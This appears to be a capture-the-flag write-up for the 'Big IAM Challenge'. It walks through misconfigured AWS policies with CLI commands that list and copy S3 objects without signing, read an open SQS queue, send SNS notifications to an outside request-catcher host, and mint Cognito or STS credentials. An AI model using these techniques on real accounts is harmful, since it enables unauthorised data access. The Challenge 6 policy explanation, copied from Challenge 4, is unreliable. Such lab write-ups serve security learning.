---
author: Moe Chaudhry
pubDatetime: 2023-11-8T24:24:54.547Z
title: "Big IAM Challenge: Identifying and exploiting AWS IAM Misconfigurations"
postSlug: IAM Challenge
featured: false
draft: true
ogImage: https://github.com/satnaing/astro-paper/assets/53733092/1ef0cf03-8137-4d67-ac81-84a032119e3a
tags:
  - Cybersecurity
  - Penetration Testing
description: ""
---

## Challenge 1

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```

### Understanding the Policy

The first statement let's anyone download an object from Amazon S3 for the specified resource.The second statement let's anyone list objects with a specific prefix

### Testing the Theory

We first list the objects within the resource designated in the IAM policy:

`aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/ --no-sign-request`

This reveals a couple of objects. The one we're interested is the `flag1.txt`. We download this file with the command below.

`aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt  ./flag1.txt --no-sign-request`

## Challenge 2

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

### Understanding the Policy

Allows all users to deliver and recieve messages from the specified SQS queue.

### Testing the Theory

`aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2 --region us-east-1 --profile username`

This command returns a response that contains a URL to an S3 bucket containing the flag

## Challenge 3

```
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

### Understanding the Policy

Allows AWS users to interact with the @tbic.wiz.io SNS endpoint

### Testing the Theory

`aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://iamchallenge123.requestcatcher.com/test@tbic.wiz.io --region us-east-1`

The URL is generated using requestcatcher.com and we use the HTTPS protocol. The request catacher site recieves a response from the subscrption and has the flag in the HTTP body

## Challenge 4

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

### Understanding the Policy

This policy is designed to restrict access to an S3 bucket, allowing only a specific admin user to access it under certain conditions. However, the use of the `ForAllValues:StringLike` operator causes a security loophole where if the key (in this case aws:PrincipalArn) is not present at all, the condition will evaluate to true, and the request will be allowed.

### Testing the Theory

We first list the objects within the resource designated in the IAM policy:

`aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request`

This reveals a couple of objects. The one we're interested is the `flag-as-admin.txt`. We download this file with the command below.

`aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt /tmp/ --no-sign-request`

## Challenge 5

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```

### Understanding the Policy

this policy allows a user or role to perform analytics and sync operations across all resources of Mobile Analytics and Cognito Sync services. Additionally, it grants them the ability to list and retrieve objects from the wiz-privatefiles S3 bucket.

### Testing the Theory

You can examine the HTML page for the challaenge to find an identity ID for the AWS CLI. This can be used to generate valid AWS credentials.

`aws cognito-identity get-credentials-for-identity --identity-id "us-east-1:b293decf-cc8b-4082-96eb-70ba01c98d1e"`

Export these into your terminal as environment variables and then run `aws sts get-caller-identity` to verify that you're making AWS calls with the new entity

![Challenge5](@assets/images/challenge5.PNG)

Then list and copy the flag over from the S3 bucket.

```
aws s3 ls s3://wiz-privatefiles/
aws s3 cp s3://wiz-privatefiles/flag1.txt
```

## Challenge 6

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```

### Understanding the Policy

This policy is designed to restrict access to an S3 bucket, allowing only a specific admin user to access it under certain conditions. However, the use of the `ForAllValues:StringLike` operator causes a security loophole where if the key (in this case aws:PrincipalArn) is not present at all, the condition will evaluate to true, and the request will be allowed.

### Testing the Theory

We first generate the token

`aws cognito-identity get-open-id-token --identity-id "us-east-1:5e3eaf20-3565-4894-bbf7-6a1836f7c27d"`

Use the generated token to create credentials.

`aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name my-session --web-identity-token <token value here>`

Export these into your terminal as environment variables and then run `aws sts get-caller-identity` to verify that you're making AWS calls with the new entity

![Challenge6](@assets/images/challenge6.PNG)

Then list and copy the flag over from the S3 bucket.

```
aws s3 ls s3://wiz-privatefiles-x1000

aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt
```

## Conclusion

In our journey through the complexities of AWS IAM policies in "The Big IAM Challenge," we've uncovered the intricate details and potential pitfalls that come with managing access in the cloud. From understanding the nuances of policy conditions to recognizing how seemingly minor misconfigurations can lead to significant security loopholes, our exploration has highlighted the importance of vigilance and precision in IAM policy creation and management.
